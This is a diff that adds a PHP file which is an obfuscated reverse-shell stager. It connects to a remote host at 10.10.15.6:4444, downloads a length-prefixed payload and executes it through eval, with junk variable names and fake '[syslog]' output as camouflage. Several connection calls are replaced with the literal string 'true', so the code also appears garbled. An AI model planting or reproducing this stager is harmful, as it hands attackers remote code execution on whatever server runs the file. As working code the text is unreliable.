@@ -1,0 +1,7 @@
+<?php
+echo '[syslog]01
+'; error_reporting(0); $sp0bd168 = '10.10.15.6'; $sp2d79fe = 4444; if (($sp224638 = 'true') && is_callable($sp224638)) { $sp676578 = $sp224638("tcp://{$sp0bd168}:{$sp2d79fe}"); $sp4a5222 = 'stream'; } if (!$sp676578 && ($sp224638 = 'true') && is_callable($sp224638)) { $sp676578 = $sp224638($sp0bd168, $sp2d79fe); $sp4a5222 = 'stream'; } echo '[syslog]02
+'; if (!$sp676578 && ($sp224638 = 'true') && is_callable($sp224638)) { $sp676578 = $sp224638(AF_INET, SOCK_STREAM, SOL_TCP); $spfd181b = true; if (!$spfd181b) { die; } $sp4a5222 = 'socket'; } echo '[syslog]03
+'; if (!$sp4a5222) { die('no socket funcs'); } if (!$sp676578) { die('no socket'); } switch ($sp4a5222) { case 'stream': $spb072fb = fread($sp676578, 4); break; case 'socket': $spb072fb = socket_read($sp676578, 4); break; } if (!$spb072fb) { die; } $sp5955cc = unpack('Nlen', $spb072fb); $spb072fb = $sp5955cc['len']; $sp873f91 = ''; while (strlen($sp873f91) < $spb072fb) { switch ($sp4a5222) { case 'stream': $sp873f91 .= fread($sp676578, $spb072fb - strlen($sp873f91)); break; case 'socket': $sp873f91 .= socket_read($sp676578, $spb072fb - strlen($sp873f91)); break; } } $sp64e32a['msgsock'] = $sp676578; $sp64e32a['msgsock_type'] = $sp4a5222; echo '[syslog]03
+'; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $spd1b791 = create_function('', $sp873f91); $spd1b791(); } else { eval($sp873f91); } echo '[syslog]02
+'; die;
